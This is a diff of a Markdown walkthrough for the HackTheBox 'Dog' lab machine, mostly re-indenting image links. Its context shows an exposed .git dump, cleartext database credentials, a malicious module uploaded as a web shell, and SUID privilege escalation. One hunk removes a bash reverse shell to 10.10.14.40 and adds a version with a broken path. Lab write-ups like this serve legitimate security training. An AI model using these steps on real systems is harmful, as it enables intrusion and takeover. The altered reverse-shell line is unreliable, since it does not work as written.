@@ -55,8 +55,7 @@ gradient: "from-purple-500 to-indigo-600"
     80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
     ```
     The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Port 80 is our primary target for web enumeration.
-
- ![Nmap scan results showing open ports 22 and 80](/cv-juan/images/dog-htb/nmap-results.png "Nmap Scan Results")
+![Nmap scan results showing open ports 22 and 80](/cv-juan/images/dog-htb/nmap-results.png "Nmap Scan Results")
     *Caption: Initial Nmap scan revealing open SSH and HTTP ports.*
 
     ---
@@ -65,7 +64,7 @@ gradient: "from-purple-500 to-indigo-600"
 
     We accessed the website at `http://10.10.11.58/`. The home page shows a "Dog" site with the title "Welcome to Dog!" and mentions "Dog obesity" with the indication "Mon, 15/07/2024 - 7:51pm by dogfBackDropSystem". This suggests the site might be running on **Backdrop CMS**.
 
-![Screenshot of the Dog website homepage](/cv-juan/images/dog-htb/website-homepage.png "Dog Website Homepage")
+    ![Screenshot of the Dog website homepage](/cv-juan/images/dog-htb/website-homepage.png "Dog Website Homepage")
     *Caption: The main page of the Dog website, indicating Backdrop CMS.*
 
     ### Discovery of an Exposed Git Repository
@@ -85,7 +84,7 @@ gradient: "from-purple-500 to-indigo-600"
     ```
     *(Note: The PDF shows `http://10.10.11.58/.git/dog_htb/` as an example, but the correct URL to download the repository root would be `http://10.10.11.58/.git/`)*
 
-![Terminal screenshot showing git-dumper command and output](/cv-juan/images/dog-htb/git-dumper.png "Downloading Git Repository")
+    ![Terminal screenshot showing git-dumper command and output](/cv-juan/images/dog-htb/git-dumper.png "Downloading Git Repository")
     *Caption: Using `git-dumper` to pull the exposed Git repository contents.*
 
     ### Analyzing the Source Code - Database Credentials
@@ -114,7 +113,7 @@ gradient: "from-purple-500 to-indigo-600"
     * **Username:** `root`
     * **Password:** `BackDropJ2024052824`
 
-![Code snippet of settings.php revealing database credentials](/cv-juan/images/dog-htb/settings-php.png "Database Credentials in settings.php")
+    ![Code snippet of settings.php revealing database credentials](/cv-juan/images/dog-htb/settings-php.png "Database Credentials in settings.php")
     *Caption: The `settings.php` file containing the cleartext database credentials.*
 
     ### Discovery of Username (tiffany@dog.htb)
@@ -137,7 +136,7 @@ gradient: "from-purple-500 to-indigo-600"
 
     Authentication was successful, and we gained access to the Dashboard of Backdrop CMS.
 
-![Backdrop CMS login page and dashboard after successful login](/cv-juan/images/dog-htb/backdrop-login-dashboard.png "Backdrop CMS Login and Dashboard")
+    ![Backdrop CMS login page and dashboard after successful login](/cv-juan/images/dog-htb/backdrop-login-dashboard.png "Backdrop CMS Login and Dashboard")
     *Caption: Successfully logged into the Backdrop CMS dashboard.*
 
     ---
@@ -200,7 +199,7 @@ gradient: "from-purple-500 to-indigo-600"
         * We uploaded `shell.tar` via the "Upload a module, theme, or layout archive to install" option.
     3.  **Confirm Upload:** The CMS reported "Installation was completed successfully".
 
-![Screenshot of Backdrop CMS module upload interface](/cv-juan/images/dog-htb/module-upload.png "Uploading the malicious module")
+    ![Screenshot of Backdrop CMS module upload interface](/cv-juan/images/dog-htb/module-upload.png "Uploading the malicious module")
     *Caption: The Backdrop CMS interface for uploading a new module/theme.*
 
     ### Locating the Uploaded Shell
@@ -219,7 +218,7 @@ gradient: "from-purple-500 to-indigo-600"
 
     **Initial User:** `www-data`
 
- ![Screenshot of the web shell with command execution](/cv-juan/images/dog-htb/web-shell-rce.png "Web Shell Remote Code Execution")
+    ![Screenshot of the web shell with command execution](/cv-juan/images/dog-htb/web-shell-rce.png "Web Shell Remote Code Execution")
     *Caption: Executing commands via the uploaded web shell.*
 
     ### Establishing a Reverse Shell
@@ -248,10 +247,10 @@ gradient: "from-purple-500 to-indigo-600"
             ```
             Or directly:
             ```bash
-            bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"
+            bash -c "bash -i >& /dev/10.10.14.40/4444 0>&1"
             ```
 
-![Terminal screenshot showing Netcat listener receiving a reverse shell](/cv-juan/images/dog-htb/reverse-shell.png "Reverse Shell Connection")
+    ![Terminal screenshot showing Netcat listener receiving a reverse shell](/cv-juan/images/dog-htb/reverse-shell.png "Reverse Shell Connection")
     *Caption: Netcat listener successfully catching a reverse shell from the 'Dog' machine.*
 
     We received a `www-data` shell on our Netcat listener!
@@ -304,7 +303,7 @@ gradient: "from-purple-500 to-indigo-600"
 
     Bingo! We have executed `whoami` as `root`.
 
- ![Terminal screenshot showing sudo bee php-eval to execute whoami as root](/cv-juan/images/dog-htb/privesc-bee-whoami.png "Sudo Bee PHP Eval")
+    ![Terminal screenshot showing sudo bee php-eval to execute whoami as root](/cv-juan/images/dog-htb/privesc-bee-whoami.png "Sudo Bee PHP Eval")
     *Caption: Using `sudo bee` to execute `whoami` as the root user.*
 
     To get a persistent root shell, we can use `bee` to set the SUID bit on `/bin/bash`. The SUID bit allows an executable to run with the permissions of the file owner (in this case, `root`), instead of the user executing it.
@@ -325,7 +324,7 @@ gradient: "from-purple-500 to-indigo-600"
     root
     ```
 
-![Terminal screenshot showing bash -p to become root](/cv-juan/images/dog-htb/root-shell.png "Root Shell")
+    ![Terminal screenshot showing bash -p to become root](/cv-juan/images/dog-htb/root-shell.png "Root Shell")
     *Caption: Obtaining a root shell using `bash -p` after setting the SUID bit.*
 
     We are root!
